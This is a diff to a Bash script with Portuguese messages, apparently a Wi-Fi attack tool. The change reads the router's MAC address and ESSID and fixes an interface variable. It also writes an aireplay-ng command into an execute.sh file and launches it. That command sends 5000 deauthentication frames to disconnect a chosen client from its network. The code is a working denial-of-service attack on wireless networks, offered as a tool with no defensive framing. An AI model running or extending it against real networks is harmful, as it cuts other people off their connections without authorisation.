@@ -117,10 +117,12 @@ function check_dependencies(){
 function get_routermac(){
 	echo -e "$color_yellow [...] Obtendo mac do roteador"
 	router_mac=$(iwconfig $card_name| grep Access | sed -e 's/Mode.*nt://g' | grep : | sed -e 's/ //g')
+	ESSID=$(iwconfig $card_name | grep ESSID | sed 's/$card_name.*://g' | sed 's/\"//g')
 	echo -e "$color_green [!] GATEWAY MAC:$color_white { $router_mac }"
+	echo -e "$color_green [!] ESSID DA REDE: $color_white { $ESSID }"
 }
 function check_interface(){
-	if [ $(iwconfig | grep -c "${cardname}mon") -lt 1 ]
+	if [ $(iwconfig | grep -c "${card_name}mon") -lt 1 ]
 		then
 			if [ $(iwconfig | grep -c "mon0") -lt 1 ]
 				then
@@ -412,7 +414,7 @@ $color_green   0~$y)$color_white Expulsar cliente escolhido"
 			echo -e ""
 			check_interface
 			ping -c 3 127.0.0.1 > dumps.txt
-			echo -e "echo -e '\033[01;31m'\naireplay-ng -0 5000 -a $router_mac -c $mac $card_mon">> execute.sh
+			echo -e "echo -e '\033[01;31m'\naireplay-ng -0 5000 -a $router_mac -c $mac --ignore-negative-one $card_mon">> execute.sh
 			chmod +x execute.sh > dumps.txt
 			gnome-terminal -- "./execute.sh" > dumps.txt
 			show_macs
